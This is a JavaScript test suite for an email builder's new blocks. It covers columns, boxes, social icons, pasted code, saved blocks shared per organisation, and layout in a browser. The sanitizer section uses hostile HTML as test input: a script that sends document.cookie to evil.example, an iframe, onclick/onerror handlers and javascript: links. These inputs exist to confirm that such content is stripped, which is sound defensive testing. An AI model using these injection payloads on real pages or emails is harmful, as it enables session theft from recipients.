// tests/builder2a-email-parts.test.js · BUILDER-2A. THE NEW EMAIL PARTS, AND BLOCKS SAVED TO USE AGAIN.
//
// The build's one test. It earns its place under CLAUDE.md's rule because it
// guards donor email: what the new blocks put in front of a donor (tables an
// inbox lays out, a phone stack, a plain-text part), that pasted code cannot
// carry a script, a frame or a handler to a donor, that no email already
// written changes by a byte, and that one org's saved blocks never reach another.
//
//   §1  Columns, Box, Social and Code each render to HTML that passes
//       lintEmailHtml, carries the phone stack (PHONE_MEDIA) and has a plain-text
//       part; Columns read column by column.
//   §2  a Code block with a <script>, an <iframe> or an on* handler is cleaned in
//       a preview (and says what went) and refused at send (EMAIL_NOT_READY).
//   §3  every starter in emailTemplateLibrary.js renders byte-identical to main
//       (5666d11), and a block whose style is all defaults renders as one with none.
//   §4  the style model: EMAIL_BLOCK_STYLE is published, a bad value is refused,
//       hide-on-phone adds its CSS only when used, a Box in a Box is refused,
//       and a Box's children count toward MAX_BLOCKS.
//   §5  saved blocks over HTTP: saved, listed, used as a COPY with fresh ids;
//       invisible, unusable and unremovable to another org; removed through the
//       one Remove and back with Undo. Ready-made blocks: a GET writes nothing,
//       using one gives a copy with Steward's photo. Brand's social links reach
//       the Social block. Export fills the footer with a sample unsubscribe line.
//   §6  the browser: the rendered new blocks opened in an 800, a 600 and a 375 px
//       window; the columns sit side by side at 800 and stack under 620 (the
//       phone breakpoint), and nothing runs off the side.
//
// RED ON MAIN (5666d11): §1 to §5 ("columns" is not an email block; no
// /email-blocks or /email-export route; no social_links column). Planted and
// watched go red: the sanitizer letting on* attributes through both of its
// checks (§2, four reds), the frame's side padding one pixel wider (§3's
// starter hash and §4), and the saved-block read without its org_id (§5: org B
// used and renamed org A's block). Letting on* past only the first check stayed
// green, because the attribute allowlist strips it again: two layers, on purpose.
//
// Never the demo org. Nothing here sends.
"use strict";
const fs = require("fs");
const os = require("os");
const path = require("path");
const crypto = require("crypto");
const bcrypt = require("bcryptjs");
const { ok, summary, api, q, closeDb, browserLegOrSkip } = require("./helpers");

const ORG = "org_builder2a", ORG2 = "org_builder2a_other";
const PW = path.join(process.env.PLAYWRIGHT_DIR || (process.env.HOME + "/steward-qa"), "node_modules", "playwright");
// The hash of every starter rendered on main before this build (5666d11). A
// build that changes the starter render on purpose updates this, and says why.
const STARTERS_ON_MAIN = "e55360cec35f10461d3c6f2d8f02e8b6d8568c6d3b2198d161eea50f894f8957";

async function wipe(org) {
  const tables = (await q(`SELECT table_name FROM information_schema.columns WHERE table_schema='public' AND column_name='org_id' AND table_name <> 'orgs'`)).map(r => r.table_name);
  for (let pass = 0; pass < 6; pass++) {
    for (const t of tables) await q(`DELETE FROM "${t}" WHERE org_id=$1`, [org]).catch(() => {});
    if (await q(`DELETE FROM orgs WHERE id=$1`, [org]).then(() => true).catch(() => false)) break;
  }
}
async function fixture(org, slug, name) {
  await wipe(org);
  await q(`INSERT INTO orgs (id,name,org_slug,onboarding_complete,onboarded_at,subscription_status,plan,timezone,mission,emails_enabled,staff_mail_enabled)
           VALUES ($1,$2,$3,1,NOW(),'active','team','America/New_York','After-school art for kids in our town.',false,false)`, [org, name, slug]);
  await q(`INSERT INTO users (id,org_id,email,password_hash,name,role) VALUES ($1,$2,$3,$4,'Robin Hale','admin')`,
    ["u_" + org, org, `${org}@test.local`, bcrypt.hashSync("loadtest1234", 4)]);
  return (await api("POST", "/auth/login", null, { email: `${org}@test.local`, password: "loadtest1234" })).body;
}

const BRAND = { band: "#0d5c3a", bandFg: "#ffffff", accent: "#c9a84c", accentFg: "#0f1a12", buttonColor: "#0d5c3a", typePairing: "dm", displayName: "Lantern Arts",
  socialLinks: { instagram: "https://instagram.com/lantern", facebook: "https://facebook.com/lantern", x: "" } };
const LINKS = { assetBase: "https://app.example", event: () => null, givingPage: () => null };
const FIELDS = { first_name: "Ada", last_gift_amount: "$50", last_gift_date: "March 3, 2026", org_name: "Lantern Arts", give_link: "https://app.example/give/lantern" };
const PIC = "https://cdn.example/photo.jpg";

const NEW_BLOCKS = {
  columns: { type: "columns", count: 3, columns: [
    { items: [{ type: "text", heading: "48 kids", text: "in the studio this fall" }] },
    { items: [{ type: "image", image: PIC, alt: "Kids painting" }] },
    { items: [{ type: "text", heading: "1,200 brushes", text: "washed by volunteers" }, { type: "button", label: "See the studio", url: "https://lantern.example/studio" }] }] },
  box: { type: "box", style: { radius: 8, borderWidth: 1 }, children: [
    { type: "image", image: PIC, alt: "The studio at night" },
    { type: "richtext", blocks: [{ type: "p", text: "Hi {{first_name}}, the lights are on." }] }] },
  social: { type: "social", size: 32 },
  code: { type: "code", html: `<table role="presentation" width="100%"><tr><td style="padding:8px;color:#3a3a35;"><p>Open studio on <strong>Friday</strong>.</p><a href="https://lantern.example">Come by</a><img src="${PIC}" alt="Easels" width="120"></td></tr></table>` },
};

(async () => {
  const EB = await import("../shared/emailBlocks.js");
  const ST = await import("../shared/emailBlockStyle.js");
  const PWm = await import("../shared/pageWidgets.js");
  const LIB = await import("../shared/emailTemplateLibrary.js");
  const TYPES = PWm.typesForSurface("email");
  const render = (blocks, mode = "preview", fields = FIELDS) => EB.renderEmail({ blocks, brand: BRAND, fields, links: LINKS, mode });

  // ── §1 · each new block renders, lints clean, stacks, has its words ──────
  for (const [key, block] of Object.entries(NEW_BLOCKS)) {
    ok(`§1 ${key} is an email block in the registry`, TYPES.includes(key));
    const v = EB.validateEmailBlocks([{ type: "header" }, block, { type: "footer" }], TYPES);
    ok(`§1 ${key} passes validateEmailBlocks`, v.ok, v.error);
    const r = render(v.blocks || [], "send");
    const lint = EB.lintEmailHtml(r.html);
    ok(`§1 ${key} renders for a send, passing lintEmailHtml`, lint.length === 0 && r.problems.length === 0, { lint, problems: r.problems });
    ok(`§1 ${key} carries the phone stack`, r.html.includes(EB.PHONE_MEDIA) && /\.st-col\{display:block !important;width:100% !important/.test(r.html));
    ok(`§1 ${key} has a plain-text part`, r.text.replace("Lantern Arts", "").trim().length > 0, r.text);
  }
  {
    const r = render([NEW_BLOCKS.columns]);
    ok("§1 Columns are table cells that stack on phones, with no flexbox or grid", (r.html.match(/<td class="st-col" width="33%"/g) || []).length === 3 && !/display:\s*(flex|grid)/.test(r.html));
    ok("§1 Columns read column by column in the plain text", /48 kids[\s\S]*in the studio this fall[\s\S]*1,200 brushes[\s\S]*washed by volunteers[\s\S]*See the studio: https:\/\/lantern\.example\/studio/.test(r.text), r.text);
    const off = render([{ ...NEW_BLOCKS.columns, stack: false }]);
    ok("§1 with stack on phones off, the cells keep their place", !/class="st-col"/.test(off.html));
    const noAlt = render([{ type: "columns", count: 2, columns: [{ items: [{ type: "image", image: PIC, alt: "" }] }, { items: [{ type: "button", label: "Go", url: "" }] }] }]);
    ok("§1 an image in a column still needs alt text, and a button somewhere to go", noAlt.problems.some(p => /column 1: add alt text/.test(p)) && noAlt.problems.some(p => /column 2: the button needs a link/.test(p)), noAlt.problems);
    const box = render([NEW_BLOCKS.box]);
    ok("§1 a Box is nested tables holding its blocks", /<table role="presentation" width="600"[^>]*bgcolor="#f0ede6"[^>]*border:1px solid #0d5c3a;border-radius:8px;[\s\S]*<img src="https:\/\/cdn\.example\/photo\.jpg" width="534"/.test(box.html));   // 600 less a 1 px border each side, less 32 px padding each side
    const social = render([NEW_BLOCKS.social]);
    ok("§1 Social draws each link as an icon with alt text, and leaves out a network with no link",
      /alt="Lantern Arts on Instagram"/.test(social.html) && /alt="Lantern Arts on Facebook"/.test(social.html) && !/ on X"/.test(social.html)
      && social.images.every(i => i.src.startsWith("https://app.example/email-icons/")), social.images);
    const none = EB.renderEmail({ blocks: [NEW_BLOCKS.social], brand: { ...BRAND, socialLinks: {} }, fields: FIELDS, links: LINKS, mode: "preview" });
    ok("§1 Social with no links in Brand says so", none.problems.some(p => /no social links in Brand/.test(p)));
  }

  // ── §2 · pasted code cannot carry a script, a frame or a handler ─────────
  for (const [what, html] of [
    ["a <script>", `<p>Hi</p><script>fetch("https://evil.example?c="+document.cookie)</script>`],
    ["an <iframe>", `<p>Hi</p><iframe src="https://evil.example"></iframe>`],
    ["an onclick handler", `<p onclick="steal()">Hi</p>`],
    ["an onerror handler on an image", `<img src="${PIC}" alt="x" onerror="steal()">`],
    ["a javascript: link", `<a href="javascript:steal()">Hi</a>`],
  ]) {
    const blocks = [{ type: "code", html }];
    const prev = render(blocks);
    ok(`§2 ${what}: the preview shows the cleaned code and says what went`, !/<script|<iframe|\son[a-z]+=|javascript:/i.test(prev.html) && prev.problems.some(p => /took out/.test(p)), prev.problems);
    let threw = null;
    try { render(blocks, "send"); } catch (e) { threw = e; }
    ok(`§2 ${what}: a send is refused (EMAIL_NOT_READY)`, threw && threw.code === "EMAIL_NOT_READY", threw && threw.message);
  }
  ok("§2 a Code block is admins' only in the block model", (PWm.WIDGETS.find(w => w.key === "code") || {}).roles?.join() === "admin");

  // ── §3 · nothing already written changes by a byte ───────────────────────
  {
    const h = crypto.createHash("sha256");
    const links = { assetBase: "https://app.example", videoPage: (p, v) => `https://app.example/watch/x/${p}/${v}`, event: () => null, givingPage: () => null };
    const brand = { band: "#0d5c3a", bandFg: "#ffffff", accent: "#c9a84c", buttonColor: "#0d5c3a", typePairing: "dm", logoUrl: null, displayName: "Sample Org" };
    const sets = [{ first_name: "Ada", last_gift_amount: "$50", last_gift_date: "March 3, 2026", org_name: "Sample Org", give_link: "https://app.example/give/x" }, { first_name: "Ada", last_gift_amount: "" }];
    let sameWithDefaults = true;
    for (const s of LIB.EMAIL_STARTERS) for (const fields of sets) for (const editable of [false, true]) {
      const r = EB.renderEmail({ blocks: s.blocks, brand, fields, links, subject: s.subject, preheader: s.preheader, mode: "preview", editable });
      h.update(r.html + "\n--\n" + r.text + "\n--\n" + JSON.stringify(r.problems));
      // A style of all defaults normalizes away, so the block is the old block.
      const v = EB.validateEmailBlocks(s.blocks.map(b => ({ ...b, style: { background: "none", hideOn: "none", borderWidth: 0, width: { value: 100, unit: "%" } } })), TYPES);
      const r2 = EB.renderEmail({ blocks: v.blocks, brand, fields, links, subject: s.subject, preheader: s.preheader, mode: "preview", editable });
      if (r2.html !== r.html) sameWithDefaults = false;
    }
    ok("§3 every starter renders byte-identical to main", h.digest("hex") === STARTERS_ON_MAIN);
    ok("§3 a style of all defaults renders exactly as no style", sameWithDefaults);
  }

  // ── §4 · the style model ─────────────────────────────────────────────────
  {
    const F = ST.EMAIL_BLOCK_STYLE.fields;
    ok("§4 EMAIL_BLOCK_STYLE publishes every field the right pane edits",
      ["align", "width", "height", "padding", "marginTop", "marginBottom", "borderWidth", "borderColor", "radius", "background", "hideOn"].every(k => F[k]));
    const bad = EB.validateEmailBlocks([{ type: "divider", style: { background: "#ff0000" } }], TYPES);
    ok("§4 a colour that is not a brand word is refused", !bad.ok && /Background must be one of/.test(bad.error), bad.error);
    const plain = render([{ type: "richtext", blocks: [{ type: "p", text: "Hi" }] }]);
    const hidden = render([{ type: "richtext", blocks: [{ type: "p", text: "Hi" }], style: { hideOn: "phone" } }]);
    ok("§4 hide on phone adds its CSS only when a block uses it", !/st-hide-phone/.test(plain.html) && /<tr[^>]* class="st-hide-phone"/.test(hidden.html) && /\.st-hide-phone\{display:none !important/.test(hidden.html));
    const styled = render([{ type: "image", image: PIC, alt: "x", style: { width: { value: 50, unit: "%" }, align: "right", marginTop: 12 } }]);
    ok("§4 an image's width, alignment and space above are honoured", /<table role="presentation" cellpadding="0" cellspacing="0" border="0" align="right"[^>]*><tr><td><img src="https:\/\/cdn\.example\/photo\.jpg" width="268"/.test(styled.html) && /padding:12px 0 0px;/.test(styled.html));
    const tall = render([{ type: "image", image: PIC, alt: "x", style: { height: 200 } }]);
    ok("§4 an image's height keeps its shape (width follows)", /height="200"[^>]*style="display:block;height:200px;width:auto;/.test(tall.html));
    const boxIn = EB.validateEmailBlocks([{ type: "box", children: [{ type: "box", children: [] }] }], TYPES);
    ok("§4 a Box inside a Box is refused", !boxIn.ok && /cannot hold another box/.test(boxIn.error), boxIn.error);
    const many = EB.validateEmailBlocks([{ type: "box", children: Array.from({ length: 39 }, () => ({ type: "divider" })) }, { type: "divider" }], TYPES);
    ok("§4 a Box's children count toward MAX_BLOCKS", !many.ok && /at most 40 blocks/.test(many.error), many.error);
    ok("§4 an id and a style are kept; neither is added", JSON.stringify(EB.validateEmailBlocks([{ type: "divider", id: "blk_1", style: { radius: 4 } }, { type: "divider" }], TYPES).blocks) === '[{"id":"blk_1","type":"divider","style":{"radius":4}},{"type":"divider"}]');
  }

  // ── §5 · saved blocks, ready-made blocks, social links, export ───────────
  const a = await fixture(ORG, "builder2a-lantern", "Lantern Arts Test");
  const b = await fixture(ORG2, "builder2a-other", "Other Org Test");
  const TOK = a.token, TOK2 = b.token;
  ok("§5 the two fixture orgs sign in", !!TOK && !!TOK2);
  const run = [{ type: "richtext", blocks: [{ type: "p", text: "Hi {{first_name}}, thank you." }] }, NEW_BLOCKS.box];
  const made = await api("POST", "/email-blocks", TOK, { name: "Thanks with a photo", blocks: run });
  const saved = made.body.block || {};
  ok("§5 a run of blocks is saved, stamped with who saved it, with its preview", made.status === 201 && saved.parts === 2 && /<!doctype html>/.test(saved.previewHtml || ""), made.body);
  const [row] = await q(`SELECT created_by, created_by_name, org_id FROM email_saved_blocks WHERE id=$1`, [saved.id]);
  ok("§5 the row carries the actor and the org", row && row.created_by === "u_" + ORG && row.org_id === ORG, row);
  ok("§5 a merge field inside it stays a field", JSON.stringify(saved.blocks).includes("{{first_name}}"));
  const refused = await api("POST", "/email-blocks", TOK, { name: "Bad", blocks: [{ type: "script" }] });
  ok("§5 a block that fails validateEmailBlocks is not saved", refused.status === 400 && refused.body.error === "invalid_blocks", refused.body);
  const used = await api("POST", `/email-blocks/${saved.id}/use`, TOK, {});
  const ids = JSON.stringify(used.body.blocks || []).match(/"id":"blk_[a-f0-9]{20}"/g) || [];
  ok("§5 using it gives a copy with a fresh id on every block, a Box's children too", used.status === 200 && ids.length === 4 && new Set(ids).size === 4, used.body);
  const again = await api("POST", `/email-blocks/${saved.id}/use`, TOK, {});
  ok("§5 each use gets new ids (a copy, never a link)", JSON.stringify(again.body.blocks).match(/"id":"blk_[a-f0-9]{20}"/g).every(id => !ids.includes(id)));
  await api("PUT", `/email-blocks/${saved.id}`, TOK, { name: "Renamed", blocks: [{ type: "divider" }] });
  ok("§5 changing the saved block later does not change a copy already used", JSON.stringify(used.body.blocks).includes("thank you"));
  // Another org: not listed, not usable, not renamed, not removed.
  const list2 = await api("GET", "/email-blocks", TOK2);
  ok("§5 another org's list does not hold it", list2.status === 200 && !(list2.body.saved || []).some(s => s.id === saved.id));
  const use2 = await api("POST", `/email-blocks/${saved.id}/use`, TOK2, {});
  const put2 = await api("PUT", `/email-blocks/${saved.id}`, TOK2, { name: "Stolen" });
  const del2 = await api("DELETE", `/email-blocks/${saved.id}`, TOK2);
  const rem2 = await api("POST", `/removals/saved_block/${saved.id}`, TOK2, {});
  ok("§5 another org cannot use, rename or remove it", [use2, put2, del2, rem2].every(r => r.status === 404), [use2, put2, del2, rem2].map(r => r.status));
  const [still] = await q(`SELECT name FROM email_saved_blocks WHERE id=$1`, [saved.id]);
  ok("§5 and it is unchanged", still && still.name === "Renamed", still);
  // The one Remove, and Undo.
  const del = await api("DELETE", `/email-blocks/${saved.id}`, TOK);
  const gone = await q(`SELECT 1 FROM email_saved_blocks WHERE id=$1`, [saved.id]);
  ok("§5 removing it moves it to the trash", del.status === 200 && gone.length === 0 && Array.isArray(del.body.undoIds), del.body);
  const undo = await api("POST", "/removals/undo", TOK, { undoIds: del.body.undoIds });
  const [back] = await q(`SELECT name, created_by FROM email_saved_blocks WHERE id=$1`, [saved.id]);
  ok("§5 Undo brings it back exactly", undo.status === 200 && back && back.name === "Renamed" && back.created_by === "u_" + ORG, { s: undo.status, back });
  // Ready-made: a GET writes nothing; use gives a copy with Steward's photo.
  const assetsBefore = (await q(`SELECT COUNT(*)::int n FROM portal_assets WHERE org_id=$1`, [ORG]))[0].n;
  const ready = await api("GET", "/email-blocks/ready", TOK);
  const assetsAfterGet = (await q(`SELECT COUNT(*)::int n FROM portal_assets WHERE org_id=$1`, [ORG]))[0].n;
  ok("§5 the ready-made blocks are offered, each previewed", ready.status === 200 && ["story_photo", "impact_numbers", "event_invite", "director_thanks", "tax_note"].every(k => (ready.body.ready || []).some(r => r.key === k && /<!doctype html>/.test(r.previewHtml))), (ready.body.ready || []).map(r => r.key));
  ok("§5 listing them writes nothing", assetsAfterGet === assetsBefore, { assetsBefore, assetsAfterGet });
  const story = await api("POST", "/email-blocks/ready/story_photo/use", TOK, {});
  const pic = (story.body.blocks || []).find(x => x.type === "image");
  ok("§5 a ready-made block comes as a copy with Steward's photo, stored for the org", story.status === 200 && pic && /^\/portal-assets\//.test(pic.image) && pic.alt && /^blk_/.test(pic.id), story.body);
  let threw = null;
  try { render(story.body.blocks, "send"); } catch (e) { threw = e; }
  ok("§5 its bracketed blanks refuse a send until filled", threw && threw.problems.some(p => /fill in \[/.test(p)), threw && threw.problems);
  // Brand's social links reach the Social block; a bad link is refused.
  const badSocial = await api("PUT", "/portal-settings", TOK, { socialLinks: { instagram: "javascript:alert(1)" } });
  ok("§5 a social link that is not https is refused", badSocial.status === 400 && badSocial.body.error === "bad_social_link", badSocial.body);
  await api("PUT", "/portal-settings", TOK, { socialLinks: { instagram: "https://instagram.com/lantern-test", website: "https://lantern.example" } });
  const prev = await api("POST", "/email-preview", TOK, { blocks: [{ type: "social" }] });
  ok("§5 the Social block reads Brand's links at render time", /href="https:\/\/instagram\.com\/lantern-test"/.test(prev.body.html || "") && /alt="[^"]+ on Instagram"/.test(prev.body.html || ""), (prev.body.problems || []));
  const prev2 = await api("POST", "/email-preview", TOK2, { blocks: [{ type: "social" }] });
  ok("§5 another org's email never shows them", prev2.status === 200 && !/lantern-test/.test(prev2.body.html || ""));
  // Export: the email as HTML, a sample unsubscribe line in the footer slot.
  const exp = await api("POST", "/email-export", TOK, { name: "Fall note", subject: "Hello {{first_name}}", blocks: [{ type: "header" }, NEW_BLOCKS.columns, { type: "footer" }] });
  ok("§5 export returns the email as HTML with a sample unsubscribe line", exp.status === 200 && /Unsubscribe<\/a>/.test(exp.body.html || "") && !exp.body.html.includes(EB.FOOTER_SLOT) && exp.body.fileName === "fall-note.html" && /Hello /.test(exp.body.subject), { s: exp.status, f: exp.body.fileName });
  const expX = await api("POST", "/email-export", TOK, { blocks: [{ type: "divider" }], as: "d_nobody" });
  ok("§5 export as a person not in this org is refused", expX.status === 404);

  // ── §6 · the browser: 800, 600 and 375 ─────────────────────────────────────
  const why = (() => { try { require(PW); return null; } catch { return "Playwright not found (set PLAYWRIGHT_DIR)"; } })();
  if (!browserLegOrSkip(why, "(browser leg)")) {
    const { chromium } = require(PW);
    const all = EB.validateEmailBlocks([{ type: "header" }, ...Object.values(NEW_BLOCKS), { type: "footer" }], TYPES).blocks;
    const html = render(all, "send").html.replace(EB.FOOTER_SLOT, "Unsubscribe").replace(/https:\/\/(cdn|app)\.example\/[^"]+/g, "data:image/gif;base64,R0lGODlhAQABAAAAACw=");
    const file = path.join(os.tmpdir(), `builder2a-${process.pid}.html`);
    fs.writeFileSync(file, html);
    const browser = await chromium.launch();
    try {
      // A 600 px email in a window under 620 px is the phone layout (PHONE_MEDIA), so
      // the desktop check opens it in an 800 px window; 600 and 375 are both phones.
      for (const width of [800, 600, 375]) {
        const page = await browser.newPage({ viewport: { width, height: 1200 } });
        await page.emulateMedia({ colorScheme: "light" });
        await page.goto("file://" + file);
        const boxes = await page.$$eval("td.st-col", tds => tds.map(t => { const r = t.getBoundingClientRect(); return { x: Math.round(r.x), y: Math.round(r.y), w: Math.round(r.width) }; }));
        const sideBySide = boxes.length === 3 && new Set(boxes.map(b => b.y)).size === 1;
        const stacked = boxes.length === 3 && boxes[0].y < boxes[1].y && boxes[1].y < boxes[2].y && boxes.every(b => b.x === boxes[0].x);
        ok(`§6 in a ${width} px window the columns ${width > 620 ? "sit side by side" : "stack"}`, width > 620 ? sideBySide : stacked, boxes);
        const over = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
        ok(`§6 at ${width} px nothing runs off the side`, over <= 0, over);
        await page.close();
      }
    } finally { await browser.close(); fs.unlinkSync(file); }
  }

  await wipe(ORG); await wipe(ORG2);
  await closeDb();
  summary();
})().catch(async e => { console.error(e); ok("suite ran", false, e.message); await closeDb().catch(() => {}); summary(); });
